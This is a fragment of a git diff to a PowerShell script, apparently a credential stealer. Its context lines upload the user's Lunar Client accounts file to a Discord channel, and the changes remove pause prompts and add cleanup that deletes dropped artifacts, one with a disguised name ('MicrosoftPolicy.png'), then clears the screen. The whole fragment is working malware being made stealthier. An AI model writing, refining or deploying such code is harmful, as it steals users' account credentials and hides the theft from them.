@@ -149,8 +149,8 @@ Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts
 Upload-Discord -text "---------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -text "||@everyone||"
 cls
-pause
 cd C:\Users\$env:UserName\
-Remove-Item C:\temp -Recurse -Force -Confirm:$false
-pause
+Remove-Item C:\temp\MicrosoftPolicy.png -Recurse -Force -Confirm:$false
+Remove-Item C:\temp\UUID.py -Recurse -Force -Confirm:$false
+cls
 exit
